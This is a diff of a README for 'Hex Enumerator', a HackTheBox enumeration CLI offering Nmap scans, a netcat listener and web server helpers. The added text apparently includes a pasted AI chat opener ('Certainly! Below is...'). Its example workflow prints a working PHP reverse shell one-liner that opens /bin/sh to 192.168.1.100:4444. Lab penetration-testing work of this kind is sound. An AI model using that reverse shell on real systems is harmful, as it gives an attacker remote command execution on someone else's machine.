@@ -9,18 +9,56 @@ Below is the documentation for the script, detailing its usage, commands, and fu
 
 ![image](https://github.com/user-attachments/assets/1aa3532d-9ad0-43b1-b37e-4c86c7fa87d8)
 
+Certainly! Below is a comprehensive README file in Markdown format for the "Hex Enumerator" tool, including instructions for cloning the repository, installing dependencies, and using the tool.
 
-## Overview
+---
 
-The HTB Enumerator Tool is a modular and interactive command-line interface (CLI) designed to assist in the enumeration of HackTheBox (HTB) machines. It provides various functionalities such as running Nmap scans, updating `/etc/hosts`, starting web servers, and more. The tool supports command auto-completion and command history for a user-friendly experience.
+# Hex Enumerator
+
+Hex Enumerator is a modular and interactive command-line interface (CLI) tool designed to assist in the enumeration of HackTheBox (HTB) machines. It provides various functionalities such as running Nmap scans, updating `/etc/hosts`, starting web servers, and more. The tool supports command auto-completion and command history for a user-friendly experience.
+
+## Features
+
+- Set IP address and hostname
+- Run Nmap scans
+- Update `/etc/hosts`
+- Check open web ports
+- Enumerate web servers
+- Start Python3 web server
+- Start Netcat listener
+- Generate PHP reverse shell command
+- Command auto-completion and history
 
 ## Installation
 
 ### Prerequisites
 
 - Python 3.x
-- `termcolor` module: Install via `pip install termcolor`
-- `readline` module: Typically included with Python on Unix-like systems
+- `termcolor` module
+- `readline` module (typically included with Python on Unix-like systems)
+
+### Clone the Repository
+
+Clone the repository using the following command:
+
+```bash
+git clone https://github.com/bugsapi/htb-scripts.git
+cd htb-scripts
+```
+
+### Install Dependencies
+
+Install the required Python packages using `pip`:
+
+```bash
+pip install -r requirements.txt
+```
+
+### Requirements File (`requirements.txt`)
+
+```
+termcolor
+```
 
 ### Required Tools
 
@@ -137,7 +175,7 @@ htb_enum > exit
 - **Auto-completion**: Press the `Tab` key to auto-complete commands.
 - **Command History**: Use the `Up` and `Down` arrow keys to navigate through previously entered commands.
 
-## Example Workflow
+### Example Workflow
 
 1. **Set IP Address**:
    ```
@@ -199,12 +237,12 @@ htb_enum > exit
    PHP reverse shell command: php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```
 
-## Error Handling
+### Error Handling
 
 - **EOFError**: If you accidentally press `Ctrl+D`, the script will prompt you to use the `exit` command to quit.
 - **KeyboardInterrupt**: If you press `Ctrl+C`, the script will remind you to use the `exit` command to quit.
 
-## Exiting the Tool
+### Exiting the Tool
 
 To exit the tool, simply type:
 
@@ -212,14 +250,17 @@ To exit the tool, simply type:
 htb_enum > exit
 ```
 
-## Saving Command History
+### Saving Command History
 
 The command history is saved to `~/.htb_enum_history` and is loaded when the tool starts. This allows you to navigate through previous commands using the arrow keys.
 
 ## Conclusion
 
-The HTB Enumerator Tool is designed to streamline the enumeration process for HackTheBox machines, providing a modular and interactive interface. With command auto-completion, history navigation, and a variety of built-in functionalities, it aims to enhance the efficiency and effectiveness of your enumeration tasks.
+The Hex Enumerator Tool is designed to streamline the enumeration process for HackTheBox machines, providing a modular and interactive interface. With command auto-completion, history navigation, and a variety of built-in functionalities, it aims to enhance the efficiency and effectiveness of your enumeration tasks.
 
 ---
 
 Feel free to customize and extend the tool as needed to fit your specific requirements. Happy enumerating!
+
+---
+
